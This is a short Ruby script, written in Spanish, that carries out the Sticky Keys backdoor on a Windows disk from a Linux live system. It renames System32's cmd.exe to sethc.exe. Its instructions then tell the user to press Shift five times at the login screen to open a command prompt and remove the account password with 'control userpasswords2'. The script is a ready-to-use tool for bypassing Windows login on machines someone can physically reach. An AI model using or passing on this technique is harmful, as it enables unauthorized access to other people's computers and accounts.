puts " este escript solo funciona con un live cd o live usb de linux, se ejecuta desde la carpeta raiz del disco duro donde se encuentre el sistema windows dado caso que no este copia este escript en la carpeta raiz otra cosa este programa funcion con cualquier distribucion que contenga ruby nota: es importente que la distribucion cuente con ruby de no ser asi puede usar la vercion de python "

puts "no me ago responsble del ma uso de este script"


puts 	         'opcion A: alterar la terminal'
puts	         'opcion B: restaurar la terminal'
puts	         'opcion C: que hacer despues'
puts	         'opcion D: creditos'
puts	         'opcion F: resetear'


puts 'Seleciona una opcion :'

crack = gets.chomp
if crack == 'A'
  system 'mv Windows/System32/cmd.exe Windows/System32/sethc.exe'
  puts ' terminal alterada listo' 
elsif  crack == 'B'
  system 'mv Windows/System32/sethc.exe Windows/System32/cmd.exe'
  puts  'terminal resturada listo' 
elsif crack == 'C'
  puts 'reinicia la pc y entra en windows normalmete al empezar preciona la tecla shift 5 veces y entonces se abrira la terminal de windows si quieres cambiar por ejemplo la clave del equipo escribe en la terminal :control userpasswords2 y podras retirar la clave del equipo una terminal puedes ase muchas cosas de pende de ti a hora  '
elsif crack == 'D'
  puts 'Dabross correo electronico ptb.jair@gmail.com '
elsif crack == 'F'
  system 'reboot'
  puts 'reiniciando'
else
  puts 'opcion no valida escribe la opcion en mayuscula' 
end 

